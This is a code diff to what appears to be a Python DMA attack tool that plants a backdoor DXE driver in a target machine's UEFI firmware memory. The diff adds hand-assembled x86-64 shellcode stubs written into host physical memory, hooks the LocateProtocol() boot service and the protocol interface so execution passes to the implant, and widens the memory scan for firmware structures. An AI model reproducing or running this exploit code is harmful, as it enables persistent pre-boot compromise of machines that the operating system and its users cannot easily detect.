@@ -11,9 +11,6 @@ GUIDS_FILE_PATH = 'guids.json'
 
 RETRY_WAIT = 1
 
-# physocal address of stub used to pass execution to the DXE driver
-STUB_ADDR = 0x10000
-
 # physical address where DXE driver will be loaded
 BACKDOOR_ADDR = 0xc0000
 
@@ -33,7 +30,7 @@ HEADER_MAGIC = 'MZ'
 
 # for find_prot_entry()
 PROT_SCAN_TO = 0xa0000000
-PROT_SCAN_FROM = 0x95000000
+PROT_SCAN_FROM = 0x76000000
 PROT_SCAN_STEP = PAGE_SIZE
 
 # for find_system_table()
@@ -67,6 +64,24 @@ ACPI_RSDT_SIG = 'RSDT'
 
 DXE_INJECT_ST   = 0
 DXE_INJECT_PROT = 1
+
+#
+# This stub is used to pass execution to the DXE driver.
+# It spins in the loop while DMA attack code is planting driver
+# image at PAYLOAD_ADDR (it might take some time) and writing
+# its entry point address at STUB_FUNC_ADDR.
+#
+STUB_CODE = [
+    '\x48\xc7\xc0\x00\x00\x01\x00',     # mov      rax, STUB_FUNC_ADDR
+    '\x0f\xae\x38',                     # clflush  [rax]
+    '\x48\x8b\x00',                     # mov      rax, [rax]
+    '\x48\x85\xc0',                     # test     rax, rax
+    '\x74\xee',                         # jz       STUB_CODE_ADDR
+    '\xff\xe0' ]                        # jmp      rax 
+
+# address of the host physical memory to plant payload stub
+STUB_CODE_ADDR = 0x10010
+STUB_FUNC_ADDR = 0x10000
 
 valid_dxe_addr = lambda addr: addr > 0x1000 and addr < 0xffffffff
 
@@ -213,16 +228,28 @@ def find_prot_entry_from_image(dev, addr, pe, known_locations):
 
     for section in pe.sections:
 
-        # find data section
+        # find .data section
         if section.Name.find('.data') == 0:
 
             sc_addr = section.VirtualAddress
             break
 
+    if sc_addr is None:
+
+        # image doesn't have .data section
+        for section in pe.sections:
+
+            # find .text section
+            if section.Name.find('.text') == 0 and section.Misc_VirtualSize > PAGE_SIZE:
+
+                # use end of the code section to search instead of .data section
+                sc_addr = section.VirtualAddress + section.Misc_VirtualSize - PAGE_SIZE
+                break
+
     if sc_addr is not None:
 
         # read section contents
-        data = dev.mem_read(addr + sc_addr, PAGE_SIZE * 2)
+        data = dev.mem_read(addr + sc_addr, PAGE_SIZE)
 
         for ptr in range(0, len(data) / 8):
             
@@ -476,8 +503,6 @@ def dxe_inject_prot(payload = None, payload_data = None, system_table = None, pr
 
         print('[+] Reading DXE phase payload from %s' % payload)
 
-        assert os.path.isfile(payload)
-
         with open(payload, 'rb') as fd:
 
             # read payload image
@@ -493,23 +518,35 @@ def dxe_inject_prot(payload = None, payload_data = None, system_table = None, pr
         # find PROTOCOL_ENTRY structure address
         prot_entry = find_prot_entry(dev)
 
-        print('[+] PROTOCOL_ENTRY address is 0x%x' % prot_entry)
+    print('[+] PROTOCOL_ENTRY address is 0x%x' % prot_entry)
 
-        # find all of the protocol interfaces
-        intf_list = prot_enum(dev, prot_entry, handler = prot_get, param = uuid.UUID(PROT_HOOK_GUID))
-        if intf_list is None or len(intf_list) == 0:
+    # find all of the protocol interfaces
+    intf_list = prot_enum(dev, prot_entry, handler = prot_get, param = uuid.UUID(PROT_HOOK_GUID))
+    if intf_list is None or len(intf_list) == 0:
 
-            raise(Exception('Unable to find protocol interfaces'))
+        raise(Exception('Unable to find protocol interfaces'))
 
-        intf_addr = intf_list[0]
-
-    else:
-
-        intf_addr = prot_entry
+    intf_addr = intf_list[0]
 
     print('[+] Protocol interface %s address is 0x%x' % (PROT_HOOK_GUID, intf_addr))
 
     if payload_data is not None:
+
+        # read original function address
+        patch_ptr = intf_addr + PROT_HOOK_FUNC * 8
+        patch_val = dev.mem_read_8(patch_ptr)
+
+        print('[+] Patch location is 0x%x' % patch_ptr)
+        print('[+] Function address is 0x%x' % patch_val)
+
+        assert valid_dxe_addr(patch_val)
+
+        # write stub into the memory
+        dev.mem_write(STUB_CODE_ADDR, ''.join(STUB_CODE))        
+
+        # hook LocateProtocol()
+        dev.mem_write_8(STUB_FUNC_ADDR, 0)
+        dev.mem_write_8(patch_ptr, STUB_CODE_ADDR)        
 
         data, entry_rva, _ = infector_get_image(payload_data, 0, 0 if system_table is None else system_table)
         entry_addr = BACKDOOR_ADDR + entry_rva
@@ -522,45 +559,38 @@ def dxe_inject_prot(payload = None, payload_data = None, system_table = None, pr
         dev.mem_write(BACKDOOR_ADDR, data)
 
         dev.mem_write_8(status_addr + 0, 0)
-        dev.mem_write_8(status_addr + 8, 0)
+        dev.mem_write_8(status_addr + 8, 0)        
 
-        # read original function address
-        patch_ptr = intf_addr + PROT_HOOK_FUNC * 8
-        patch_val = dev.mem_read_8(patch_ptr)
+        stub_2_addr = STUB_CODE_ADDR + len(''.join(STUB_CODE))
 
-        print('[+] Patch location is 0x%x' % patch_ptr)
-        print('[+] Function address is 0x%x' % patch_val)
-
-        assert valid_dxe_addr(patch_val)
-
-        # make stub code to call the payload
-        stub = [ '\x51',                                # push   rcx
-                 '\x48\xb8' + pack('Q', patch_val),     # mov    rax, patch_val
-                 '\x48\xb9' + pack('Q', patch_ptr),     # mov    rcx, patch_ptr
-                 '\x48\x89\x01',                        # mov    qword ptr [rcx], rax
-                 '\x52',                                # push   rdx
-                 '\x41\x50',                            # push   r8
-                 '\x41\x51',                            # push   r9
-                 '\x41\x52',                            # push   r10
-                 '\x41\x53',                            # push   r11   
-                 '\x48\x83\xec\x28',                    # sub    rsp, 0x28
-                 '\x48\xb8' + pack('Q', entry_addr),    # mov    rax, entry_addr
-                 '\xff\xd0',                            # call   rax 
-                 '\x48\x83\xc4\x28',                    # add    rsp, 0x28                 
-                 '\x41\x5b',                            # pop    r11
-                 '\x41\x5a',                            # pop    r10
-                 '\x41\x59',                            # pop    r9
-                 '\x41\x58',                            # pop    r8
-                 '\x5a',                                # pop    rdx
-                 '\x59',                                # pop    rcx
-                 '\x48\xb8' + pack('Q', patch_val),     # mov    rax, patch_val
-                 '\xff\xe0' ]                           # jmp    rax 
+        # make secondary stub code to call the payload
+        stub_2 = [ '\x51',                                # push   rcx
+                   '\x48\xb8' + pack('Q', patch_val),     # mov    rax, patch_val
+                   '\x48\xb9' + pack('Q', patch_ptr),     # mov    rcx, patch_ptr
+                   '\x48\x89\x01',                        # mov    qword ptr [rcx], rax
+                   '\x52',                                # push   rdx
+                   '\x41\x50',                            # push   r8
+                   '\x41\x51',                            # push   r9
+                   '\x41\x52',                            # push   r10
+                   '\x41\x53',                            # push   r11   
+                   '\x48\x83\xec\x28',                    # sub    rsp, 0x28
+                   '\x48\xb8' + pack('Q', entry_addr),    # mov    rax, entry_addr
+                   '\xff\xd0',                            # call   rax 
+                   '\x48\x83\xc4\x28',                    # add    rsp, 0x28                 
+                   '\x41\x5b',                            # pop    r11
+                   '\x41\x5a',                            # pop    r10
+                   '\x41\x59',                            # pop    r9
+                   '\x41\x58',                            # pop    r8
+                   '\x5a',                                # pop    rdx
+                   '\x59',                                # pop    rcx
+                   '\x48\xb8' + pack('Q', patch_val),     # mov    rax, patch_val
+                   '\xff\xe0' ]                           # jmp    rax 
 
         # write stub into the memory
-        dev.mem_write(STUB_ADDR, ''.join(stub))
+        dev.mem_write(stub_2_addr, ''.join(stub_2))
 
-        # set up hook
-        dev.mem_write_8(patch_ptr, STUB_ADDR)
+        # pass execution to the secondary stub
+        dev.mem_write_8(STUB_FUNC_ADDR, stub_2_addr)
 
         print('%f sec.' % (time.time() - start_time))
 
@@ -571,8 +601,6 @@ def dxe_inject_st(payload = None, payload_data = None, system_table = None, prot
     if payload is not None:
 
         print('[+] Reading DXE phase payload from %s' % payload)
-
-        assert os.path.isfile(payload)
 
         with open(payload, 'rb') as fd:
 
@@ -609,6 +637,13 @@ def dxe_inject_st(payload = None, payload_data = None, system_table = None, prot
 
     if payload_data is not None:
 
+        # write stub into the memory
+        dev.mem_write(STUB_CODE_ADDR, ''.join(STUB_CODE))        
+
+        # hook LocateProtocol()
+        dev.mem_write_8(STUB_FUNC_ADDR, 0)
+        dev.mem_write_8(boot_services + EFI_BOOT_SERVICES_LocateProtocol, STUB_CODE_ADDR)        
+
         data, entry_rva, _ = infector_get_image(payload_data, locate_protocol, system_table)
         new_locate_protocol = BACKDOOR_ADDR + entry_rva
 
@@ -625,8 +660,8 @@ def dxe_inject_st(payload = None, payload_data = None, system_table = None, prot
         print('Hooking LocateProtocol(): 0x%.8x -> 0x%.8x' % \
               (locate_protocol, new_locate_protocol))
 
-        # hook LocateProtocol()
-        dev.mem_write_8(boot_services + EFI_BOOT_SERVICES_LocateProtocol, new_locate_protocol)        
+        # pass execution to the image
+        dev.mem_write_8(STUB_FUNC_ADDR, new_locate_protocol)
 
         print('%f sec.' % (time.time() - t))
 
